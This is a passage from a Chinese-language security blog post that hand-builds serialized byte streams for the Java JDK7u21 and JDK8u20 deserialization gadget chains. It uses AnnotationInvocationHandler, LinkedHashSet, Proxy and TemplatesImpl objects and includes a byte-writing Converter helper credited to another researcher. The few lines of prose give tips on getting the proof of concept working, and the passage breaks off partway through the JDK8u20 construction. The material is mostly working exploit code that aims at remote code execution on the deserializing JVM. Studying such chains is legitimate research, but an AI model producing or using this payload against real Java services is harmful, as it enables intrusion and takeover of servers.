</span></span><span style="display:flex;"><span>                                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">1</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#7f848e">//这里需要填上L, 所以就不用getName了
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                            <span style="color:#7f848e">//另外注意后面要加分号
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;L&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;h&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Ljava/lang/reflect/InvocationHandler;&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#7f848e">//superclass
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                            <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                        <span style="color:#7f848e">//h
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                        <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#98c379">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#d19a66">6182022883658399397L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#7f848e">//这里需要填上L, 所以就不用getName了
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;L&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;memberValues&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Ljava/util/Map;&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;L&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;type&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Ljava/lang/Class;&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                <span style="color:#7f848e">//memberValues
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                    <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#d19a66">362498820763181265L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">SC_WRITE_METHOD</span><span style="color:#56b6c2">|</span><span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">),</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;F&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;loadFactor&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;I&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;threshold&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                            <span style="color:#d19a66">0x3f400000</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                            <span style="color:#d19a66">0x0000000c</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                            <span style="color:#7f848e">//objectAnnotation
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                                <span style="color:#e06c75">TC_BLOCKDATA</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">8</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">16</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;f5a5a608&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#e06c75">TC_REFERENCE</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">baseWireHandle</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">9</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                        		<span style="color:#7f848e">//type
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                        			<span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            				<span style="color:#e06c75">TC_ENDBLOCKDATA</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">};</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">serializeddata</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Converter</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toBytes</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">serializedObject</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">System</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">out</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">println</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">HexBin</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">encode</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">serializeddata</span><span style="color:#56b6c2">));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ByteArrayInputStream</span> <span style="color:#e06c75">byteArrayInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">serializeddata</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">objectInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayInputStream</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Object</span> <span style="color:#e06c75">o</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">objectInputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readObject</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">System</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">out</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">println</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">o</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// 这里借用了pwntester大佬的代码
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#7f848e">// https://github.com/pwntester/JRE8u20_RCE_Gadget/blob/master/src/main/java/util/Converter.java
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#7f848e">// 这部分又引用自 http://slightlyrandombrokenthoughts.blogspot.com/2010/08/breaking-defensive-serialization.html
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">Converter</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#61afef;font-weight:bold">toBytes</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">objs</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">ByteArrayOutputStream</span> <span style="color:#e06c75">baos</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayOutputStream</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">DataOutputStream</span> <span style="color:#e06c75">dos</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">DataOutputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">baos</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Object</span> <span style="color:#e06c75">obj</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">objs</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">treatObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">dos</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">obj</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">dos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">close</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">baos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toByteArray</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">treatObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">DataOutputStream</span> <span style="color:#e06c75">dos</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span> <span style="color:#e06c75">obj</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">obj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">Byte</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">dos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeByte</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">Byte</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">obj</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">obj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">Short</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">dos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeShort</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">Short</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">obj</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">obj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">Integer</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">dos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeInt</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">Integer</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">obj</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">obj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">Long</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">dos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeLong</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">Long</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">obj</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">obj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">String</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">dos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeUTF</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">obj</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">ByteArrayOutputStream</span> <span style="color:#e06c75">ba</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayOutputStream</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">ObjectOutputStream</span> <span style="color:#e06c75">oos</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectOutputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ba</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">oos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">obj</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">oos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">close</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">dos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ba</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toByteArray</span><span style="color:#56b6c2">(),</span> <span style="color:#d19a66">4</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ba</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">size</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">4</span><span style="color:#56b6c2">);</span> <span style="color:#7f848e">// 4 = skip the header
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>            <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>吃了不少苦头，终于整出来了~~</p>
<p>这里有个坑点，<code>TC_STRING</code>后面跟的是类似<code>Ljava/lang/Class;</code>这种形式的字符串，所以不能用<code>getName()</code>方法</p>
<p>（卡了挺长时间的，最后硬是跟<code>JDK7u21</code>链子序列化出来的字符串比较才看出问题来，太菜了(╥╯^╰╥)）</p>
<p>然后还有一个问题，<code>POC</code>生成的字节流可能会受到<code>JDK</code>版本的影响，出现非预期效果，所以建议<code>POC</code>跑通一个版本后，就将<code>serializedData</code>固定成有效的字节流</p>
<h3 id="构造jdk8u20链">构造JDK8u20链</h3>
<p>在<code>JDK7u21</code>链的基础上，开始构造<code>JDK8u20</code>链</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">serializedObject</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">[]{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">STREAM_MAGIC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">STREAM_VERSION</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//Contents
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>            <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                <span style="color:#7f848e">//className
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                <span style="color:#e06c75">LinkedHashSet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                <span style="color:#7f848e">//seriavalVersionUID
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                <span style="color:#56b6c2">-</span><span style="color:#d19a66">2851667679971038690L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                <span style="color:#7f848e">//classDescFlags
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span><span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                <span style="color:#7f848e">//fieldCount
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                <span style="color:#7f848e">//classAnnotations
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#7f848e">//superClassDesc
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#7f848e">//className
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#e06c75">HashSet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#7f848e">//seriavalVersionUID
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#56b6c2">-</span><span style="color:#d19a66">5024744406713321676L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#7f848e">//classDescFlags
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)(</span><span style="color:#e06c75">SC_WRITE_METHOD</span><span style="color:#56b6c2">|</span><span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">),</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#7f848e">//fieldCount
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#7f848e">//classAnnotations
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#7f848e">//superClassDesc
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                  <span style="color:#7f848e">//java.util.HashSet
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#7f848e">//ObjectAnnotation
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#e06c75">TC_BLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">12</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">16</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">16192</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">2</span><span style="color:#56b6c2">,</span>   <span style="color:#7f848e">//2表示个数
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#7f848e">//contents
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#7f848e">//LinkedHashSet的第一个元素templatesImpl
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#7f848e">//LinkedHashSet的第二个元素proxy
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">TC_PROXYCLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#d19a66">1</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//superclass
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#e06c75">Proxy</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#56b6c2">-</span><span style="color:#d19a66">2222568056686623797L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">2</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;L&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;tmpFiled&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Ljava/lang/Object;&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;L&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;h&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Ljava/lang/reflect/InvocationHandler;&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#7f848e">//superclass
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                    <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">,</span>
